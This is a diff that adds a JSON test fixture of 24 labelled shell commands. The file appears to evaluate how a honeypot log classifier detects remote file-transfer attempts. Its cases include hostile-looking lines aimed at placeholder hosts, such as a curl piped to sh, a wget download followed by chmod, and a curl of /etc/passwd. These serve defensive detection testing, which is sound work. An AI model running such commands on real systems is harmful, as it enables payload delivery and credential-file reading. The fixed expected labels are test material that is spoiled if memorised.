@@ -1,0 +1,31 @@
+{
+  "schema_version": "typed_command_transfer_attempt_evaluation.v1",
+  "evaluation_id": "cowrie-command-transfer-attempt-20260730",
+  "expected_labels_frozen_before_execution": true,
+  "cases": [
+    {"case_id": "CTA-001", "command": "curl https://downloads.invalid/tool.bin", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://downloads.invalid/tool.bin"], "eligible_matches": 1},
+    {"case_id": "CTA-002", "command": "wget https://mirror.invalid/drop -O /var/tmp/drop.bin", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://mirror.invalid/drop"], "eligible_matches": 1},
+    {"case_id": "CTA-003", "command": "curl -L -o /opt/cache/item https://cdn.invalid/item", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://cdn.invalid/item"], "eligible_matches": 1},
+    {"case_id": "CTA-004", "command": "wget --output-document '/tmp/staged item' https://repo.invalid/stage", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://repo.invalid/stage"], "eligible_matches": 1},
+    {"case_id": "CTA-005", "command": "env curl -s https://assets.invalid/a", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://assets.invalid/a"], "eligible_matches": 1},
+    {"case_id": "CTA-006", "command": "curl https://one.invalid/a https://two.invalid/b", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://one.invalid/a", "https://two.invalid/b"], "eligible_matches": 2},
+    {"case_id": "CTA-007", "command": "wget -q https://quiet.invalid/a", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://quiet.invalid/a"], "eligible_matches": 1},
+    {"case_id": "CTA-008", "command": "curl https://context.invalid/a", "outcome": "success", "attck": "T1105", "inject_non_authoritative_context": true, "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://context.invalid/a"], "eligible_matches": 1},
+    {"case_id": "CTA-009", "command": "curl https://failed.invalid/a", "outcome": "failure", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://failed.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTA-010", "command": "wget https://unknown.invalid/a", "outcome": "unknown", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://unknown.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTA-011", "command": "curl https://pipe.invalid/a | sh", "outcome": "success", "expected_operations": ["remote_content_access", "remote_content_pipe_source", "transfer_attempt", "shell_pipe_execution_attempt"], "expected_urls": ["https://pipe.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTA-012", "command": "wget https://compound.invalid/a -O /tmp/a && chmod 700 /tmp/a", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt", "permission_modify"], "expected_urls": ["https://compound.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTA-013", "command": "curl -I https://headers.invalid/a", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-014", "command": "wget --execute robots=off https://unsupported.invalid/a", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-015", "command": "curl -o", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-016", "command": "wget", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-017", "command": "curl \"$REMOTE_URL\"", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-018", "command": "wget https://expand.invalid/a -O \"$OUTPUT_FILE\"", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-019", "command": "echo https://reference.invalid/not-read", "outcome": "success", "attck": "T1105", "inject_non_authoritative_context": true, "expected_operations": ["literal_data_emission"], "expected_urls": ["https://reference.invalid/not-read"], "eligible_matches": 0},
+    {"case_id": "CTA-020", "command": "scp /tmp/a user@example.invalid:/tmp/a", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-021", "command": "curl file:///etc/passwd", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-022", "command": "curl 'https://broken.invalid/a", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-023", "command": "wget -O /tmp/a", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTA-024", "command": "fetch https://unsupported.invalid/a", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": ["https://unsupported.invalid/a"], "eligible_matches": 0}
+  ]
+}
